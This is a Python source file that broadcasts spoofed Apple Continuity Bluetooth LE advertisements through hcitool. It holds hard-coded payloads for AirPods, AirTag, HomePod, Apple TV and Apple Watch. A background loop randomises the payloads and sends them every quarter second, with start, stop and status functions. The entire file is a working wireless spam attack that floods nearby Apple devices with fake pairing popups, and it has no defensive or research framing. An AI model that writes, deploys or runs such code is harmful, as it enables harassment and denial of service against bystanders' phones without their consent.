import subprocess, threading, time, random

POPUP_TYPES = {
    'airpods':     'AirPods',
    'airpods_pro': 'AirPods Pro',
    'airpods_max': 'AirPods Max',
    'airtag':      'AirTag',
    'homepod':     'HomePod',
    'appletv':     'Apple TV',
    'watch':       'Apple Watch',
}

_PAYLOADS = {
    'airpods':     ['07','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
    'airpods_pro': ['09','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
    'airpods_max': ['0f','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
    'airtag':      ['12','03','00','00','10','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00','00'],
    'homepod':     ['0d','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
    'appletv':     ['10','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
    'watch':       ['0e','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
}

_state = {'running': False, 'count': 0, 'popup_type': 'airpods', 'thread': None}


def _send(payload):
    args = ['1e', '02', '01', '1a', '1a', 'ff', '4c', '00'] + payload
    subprocess.run(
        ['hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008'] + args,
        capture_output=True, timeout=3
    )


def _loop(popup_type, types_list):
    subprocess.run(['hciconfig', 'hci0', 'leadv', '3'], capture_output=True)
    if types_list:
        bases = [list(_PAYLOADS[t]) for t in types_list if t in _PAYLOADS]
    elif popup_type == 'all':
        bases = [list(v) for v in _PAYLOADS.values()]
    else:
        bases = [list(_PAYLOADS.get(popup_type, _PAYLOADS['airpods']))]
    if not bases:
        bases = [list(_PAYLOADS['airpods'])]
    idx = 0
    while _state['running']:
        payload = list(bases[idx % len(bases)])
        idx += 1
        payload[-1] = f'{random.randint(0, 255):02x}'
        payload[-2] = f'{random.randint(0, 255):02x}'
        _send(payload)
        _state['count'] += 1
        time.sleep(0.25)
    subprocess.run(['hciconfig', 'hci0', 'noleadv'], capture_output=True)


def start(popup_type='airpods', types_list=None):
    if _state['running']:
        return status()
    valid_list = [t for t in (types_list or []) if t in _PAYLOADS]
    if not valid_list and popup_type not in _PAYLOADS and popup_type != 'all':
        popup_type = 'airpods'
    label = ','.join(valid_list) if valid_list else popup_type
    _state.update(running=True, count=0, popup_type=label)
    t = threading.Thread(target=_loop, args=(popup_type, valid_list or None), daemon=True)
    _state['thread'] = t
    t.start()
    return status()


def stop():
    _state['running'] = False
    _state['thread'] = None
    return status()


def status():
    return {
        'running': _state['running'],
        'popup_type': _state['popup_type'],
        'count': _state['count'],
        'types': POPUP_TYPES,
    }
